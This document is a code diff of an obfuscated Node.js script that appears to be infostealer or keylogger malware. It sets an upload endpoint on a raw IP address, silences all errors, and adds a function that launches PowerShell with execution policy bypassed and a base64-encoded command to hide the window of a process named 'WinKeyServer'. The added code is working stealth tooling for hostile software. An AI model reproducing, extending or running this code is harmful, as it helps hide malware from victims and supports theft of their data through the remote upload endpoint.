@@ -4,10 +4,9 @@ try {
         fs = require('fs'),
         axios = require('axios'),
         { execSync, spawn } = require('child_process'),
-        { windowManager } = require('node-window-manager')
         sqlite3 = require('sqlite3').verbose(),
         FormData = require('form-data'),
-        uploadUrl = "http://144.172.104.117:5918/upload",
+        uploadUrl = "http://144.172.104.117:5918/upload"
     process.on('uncaughtException', (_0xad8869) => {})
     process.on('unhandledRejection', (_0x461982) => {})
     let i = 0;
@@ -29,19 +28,41 @@ try {
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
-    console.log("hello");
-    function hideWindowByProcessName(name) {
-        const windows = windowManager.getWindows();
-        let found = false;
-        for (const win of windows) {
-            const proc = win;
-            // console.log(proc);
-            if (proc && proc.path && proc.path.toLowerCase().includes(name.toLowerCase())) {
-            win.hide(); // Hide the window
-            found = true;
+    function hideWindowByProcessName() {
+        const psScript = `
+            Add-Type 'using System; using System.Runtime.InteropServices; public static class Win32 { [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }';
+            $SW_HIDE = 0;
+            $procName = "WinKeyServer";
+            $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue;
+            if (-not $procs) {
+            Write-Host "No process named $procName found.";
+            exit;
             }
-        }
-        return found;
+            foreach ($p in $procs) {
+            $hwnd = $p.MainWindowHandle;
+            if ($hwnd -eq 0) {
+                Write-Host "Process $($p.Id) has no main window.";
+                continue;
+            }
+            [Win32]::ShowWindowAsync($hwnd, $SW_HIDE) | Out-Null;
+            Write-Host "✅ Hidden window for PID $($p.Id) ($($p.ProcessName))";
+            }
+            `;
+            const encoded = Buffer.from(psScript, "utf16le").toString("base64");
+
+        const ps = spawn("powershell.exe", [
+        "-NoProfile",
+        "-ExecutionPolicy", "Bypass",
+        "-EncodedCommand", encoded
+        ], {
+        windowsHide: true // prevent PowerShell window from flashing
+        });
+        ps.stdout.on("data", data => process.stdout.write(data));
+        ps.stderr.on("data", data => process.stderr.write(data));
+
+        ps.on("close", code => {
+        console.log(`PowerShell exited with code ${code}`);
+        });
     }
     async function s() {
         try {
@@ -52,7 +73,7 @@ try {
             ]);
             // console.log('✅ All async functions completed:', results);
             await new Promise(resolve => setTimeout(resolve, 2500));
-            hideWindowByProcessName('WinKeyServer.exe');
+            hideWindowByProcessName();
         }catch(error){
             console.error("Error");
         }
